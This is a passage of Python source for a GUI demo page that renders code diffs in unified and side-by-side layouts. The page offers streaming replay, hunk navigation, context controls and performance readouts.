        return self.stream is not None and self.fed >= len(self._lines)

    def start_replay(self) -> None:
        """
        Start feeding the case's unified text to a stream, from its first line.
        """
        self.stream = UnifiedDiffStream()
        self._lines = self.case.unified_text().splitlines(keepends=True)
        self.fed = 0
        self._carry = 0.0
        self.paused = False
        self._show(self.stream.diff)

    def stop_replay(self) -> None:
        """
        Back to the case as a whole diff, with the full texts if it has them.
        """
        if self.stream is None:
            return
        self.stream = None
        self._show(self.case.diff(self.context_lines))

    def feed(self, count: int) -> int:
        """
        Feed up to `count` more lines. Returns how many were left to feed.
        """
        if self.stream is None:
            return 0
        take = self._lines[self.fed : self.fed + max(0, count)]
        if take:
            self.stream.feed("".join(take))
            self.fed += len(take)
            self._show(self.stream.diff)
        return len(take)

    def advance(self, seconds: float) -> int:
        """
        Let `seconds` pass at the current rate. Whole lines only; the rest is carried.
        """
        if self.stream is None or self.paused or self.replay_done:
            return 0
        self._carry += max(0.0, seconds) * self.rate
        whole = int(self._carry)
        self._carry -= whole
        return self.feed(whole)

    # -- readouts ----------------------------------------------------------

    def copied_line(self) -> str:
        if self.copied is None:
            return (
                "clipboard: nothing copied yet. Select in a view and press Ctrl+C; "
                "markers and line numbers are drawn and never copied."
            )
        lines = self.copied.split("\n")
        first = lines[0] if len(lines[0]) <= 60 else lines[0][:57] + "..."
        return (
            f"clipboard (copy {self.copies}): {len(lines)} line(s), {len(self.copied)} "
            f"character(s), first line {first!r}"
        )

    def readouts(self) -> tuple[str, ...]:
        """
        The lines under the controls: which view draws, then counts only.

        With no views, the one line the page draws instead of everything.
        """
        if not self.views:
            return (not_drawing(self.reason),)
        diff = self.diff
        unified = self.views[DiffLayout.UNIFIED]
        side = self.views[DiffLayout.SIDE_BY_SIDE]
        hunks = sum(len(file.hunks) for file in diff.files)
        on_screen = " / ".join(str(len(self.views[layout].visible_rows)) for layout in self.stats)
        # The library counts no glyphs. What there is to count is what the
        # views have asked it to change, and whether a draw said no.
        edits = sum(sum(self.views[layout].edits.values()) for layout in self.views)
        drawn = f"library edits {edits}"
        if any(answered is False for answered in self.stats.values()):
            drawn += " (not answered: something in view was not set as asked)"
        counts = (
            f"+{diff.added} -{diff.removed} in {len(diff.files)} file(s), {hunks} hunk(s); "
            f"rows: unified {unified.row_count}, side by side {side.row_count}; "
            f"on screen {on_screen or '0'}"
        )
        cost = (
            f"drawing the view(s): {self.draw_ms:.2f} ms this frame, {self.mean_ms:.2f} mean; "
            f"{drawn}; expandable gaps {self.expandable}"
        )
        if self.stream is not None:
            state = "done" if self.replay_done else ("paused" if self.paused else "running")
            cost += f"; replay {state}: line {self.fed} of {len(self._lines)}"
        return (
            "renderer: TypesetDiffView (imtypeset)",
            counts,
            cost,
            self.hunk_line(),
            self.copied_line(),
        )

    # -- the frame ---------------------------------------------------------

    def draw(self) -> None:
        from imgui_bundle import imgui

        if not self.views:
            self.frames += 1
            say_why_not(self.reason)
            return
        try:
            self._frame(imgui)
        except TypesetUnavailable as exc:
            # A view said the library cannot draw (any more). Every child and
            # every pushed colour of this frame has been closed on the way
            # out; the page is the one line from the next frame on.
            self._give_up(exc)

    def _frame(self, imgui: Any) -> None:
        """
        The controls, the readouts and the panes. Every call of a view's is under here.
        """
        self.advance(imgui.get_io().delta_time)
        self._controls()
        caption(self.case.note)
        for line in self.readouts():
            caption(line)
        if self.error:
            caption(self.error)
        imgui.separator()
        self._keys()

        available = imgui.get_content_region_avail().x
        layouts = [view.layout for view in self.shown(available)]
        spacing = imgui.get_style().item_spacing.x
        widths = (
            (available,)
            if len(layouts) == 1
            else (
                (available - spacing) * UNIFIED_SHARE,
                (available - spacing) * (1.0 - UNIFIED_SHARE),
            )
        )
        palette = self.palette
        self.stats = {}
        hovered: DiffLayout | None = None
        started = self.timer()
        for number, (layout, width) in enumerate(zip(layouts, widths, strict=True)):
            if number:
                imgui.same_line()
            imgui.push_style_color(imgui.Col_.child_bg, palette.page)
            imgui.begin_child(
                f"##imscribe-diff-pane-{layout.value}",
                imgui.ImVec2(max(width, 1.0), 0.0),
                imgui.ChildFlags_.borders.value,
            )
            try:
                self.stats[layout] = self.views[layout].draw(
                    fonts=self.context.fonts, palette=palette
                )
                if imgui.is_window_hovered(imgui.HoveredFlags_.child_windows.value):
                    hovered = layout
            finally:
                imgui.end_child()
                imgui.pop_style_color()
        self.draw_ms = (self.timer() - started) * 1000.0
        self.frames += 1
        self.mean_ms += (self.draw_ms - self.mean_ms) / min(self.frames, 60)
        self.adopt()
        if len(layouts) == 2 and hovered is not None:
            # The pane under the mouse is the one being scrolled: the other
            # follows it. (Stepping hunks moves both by itself.)
            self.follow(hovered)

    def _keys(self) -> None:
        """
        `j` and `k`: next and previous hunk, while the page has the keyboard.
        """
        from imgui_bundle import imgui

        if imgui.get_io().want_text_input:
            return
        if not imgui.is_window_focused(imgui.FocusedFlags_.root_and_child_windows.value):
            return
        if imgui.is_key_pressed(imgui.Key.j, False):
            self.next_hunk()
        if imgui.is_key_pressed(imgui.Key.k, False):
            self.previous_hunk()

    def _controls(self) -> None:
        """
        The two rows of widgets. What a click asks of a view is done after
        every widget is closed (`asked`), so a view that raises
        `TypesetUnavailable` leaves no combo and no disabled block open.
        """
        from imgui_bundle import imgui

        asked: list[Callable[[], object]] = []
        debug_toggle(self.context)
        imgui.same_line()
        imgui.set_next_item_width(300.0)
        if imgui.begin_combo("##imscribe-diff-case", self.case.label):
            heading = False
            for case in self.cases:
                if case.hard and not heading:
                    imgui.separator_text("hard cases")
                    heading = True
                if imgui.selectable(case.label, case is self.case)[0]:
                    asked.append(partial(self.choose, case))
            imgui.end_combo()
        for mode in Mode:
            imgui.same_line()
            if imgui.radio_button(mode.value, self.mode is mode):
                self.set_mode(mode)
        imgui.same_line()
        changed, on = imgui.checkbox("syntax", self.syntax_on)
        if changed:
            asked.append(lambda: self.set_syntax(on))
        imgui.same_line()
        changed, dark = imgui.checkbox("dark", self.dark)
        if changed:
            asked.append(lambda: self.set_dark(dark))
        imgui.same_line()
        changed, capped = imgui.checkbox("cap", self.capped)
        if changed:
            asked.append(lambda: self.set_capped(capped))

        if imgui.button("previous hunk (k)"):
            asked.append(self.previous_hunk)
        imgui.same_line()
        if imgui.button("next hunk (j)"):
            asked.append(self.next_hunk)
        imgui.same_line()
        can_context = self.case.from_texts and self.stream is None
        imgui.begin_disabled(not can_context)
        imgui.set_next_item_width(120.0)
        changed, lines = imgui.slider_int("context", self.context_lines, 0, MAX_CONTEXT, "%d lines")
        if changed:
            asked.append(lambda: self.set_context(lines))
        imgui.end_disabled()
        imgui.same_line()
        imgui.begin_disabled(not self.expandable)
        if imgui.button(f"expand +{self._step()}"):
            asked.append(self.expand)
        imgui.same_line()
        if imgui.button("expand all"):
            asked.append(lambda: self.expand(everything=True))
        imgui.end_disabled()
        imgui.same_line()
        if self.stream is None:
            if imgui.button("replay as a stream"):
                asked.append(self.start_replay)
        else:
            if imgui.button("show whole"):
                asked.append(self.stop_replay)
            imgui.same_line()
            if imgui.button("resume" if self.paused else "pause"):
                self.paused = not self.paused
            imgui.same_line()
            if imgui.button("restart"):
                asked.append(self.start_replay)
            imgui.same_line()
            imgui.set_next_item_width(120.0)
            _, self.rate = imgui.slider_float(
                "##imscribe-diff-rate", self.rate, 1.0, 400.0, "%.0f lines/s"
            )
        for action in asked:
            action()


PAGE = PageSpec(
    name="Diff",
    order=310,
    factory=DiffPage,
    group="Diff",
    caption="unified and side by side, on the diffs a coding agent's host is handed",
    options=(
        "unified",
        "side",
        "both",
        "dark",
        "cap",
        "stream",
        "edit",
        "new",
        "long",
        "multiedit",
        "anchor",
        "git",
        "wide",
        "tokens",
        "deleted",
        "nul",
        "noeol",
        "noeol-text",
        "eol",
        "mail",
        "combined",
        "fence",
        "unseen",
        "u0",
    ),
    shots=("", "git,side", "wide,unified,dark", "long,both"),
)
